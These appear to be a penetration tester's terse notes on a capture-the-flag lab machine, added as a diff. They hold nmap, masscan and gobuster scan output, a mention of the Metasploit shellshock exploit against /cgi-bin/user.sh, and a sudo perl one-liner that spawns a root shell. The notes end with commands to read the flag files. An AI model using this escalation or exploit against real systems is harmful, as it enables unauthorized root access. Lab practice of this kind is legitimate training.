@@ -1,0 +1,60 @@
+---NMAP---
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+PORT      STATE    SERVICE VERSION
+80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp  open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+9548/tcp  filtered unknown
+34519/tcp filtered unknown
+43410/tcp filtered unknown
+
+
+---MASSCAN---
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 2222/tcp on 10.10.10.56
+Discovered open port 80/tcp on 10.10.10.56
+
+---GOBUSTER---
+/ (common.txt):
+  /cgi-bin/ (Status: 403)
+  /index.html (Status: 200)
+  /server-status (Status: 403)
+
+/ (big.txt):
+  /cgi-bin/ (Status: 403)
+  /server-status (Status: 403)
+
+/cgi-bin/ (common.txt):
+  -
+/cgi-bin/ (big.txt):
+  -
+/cgi-bin/ (directory-list-lowercase-2.3-medium.txt):
+  /user.sh (Status: 200)
+
+---ATTEMPTS---j
+using shellshock exploit from msfconsole
+done!
+
+---privesc---
+*sudo -l
+  (root) NOPASSWD: /usr/bin/perl
+*sudo /usr/bin/perl -e 'system("/bin/bash")'
+done!
+
+cat /root/root.txt
+cat /home/shelly/user.txt
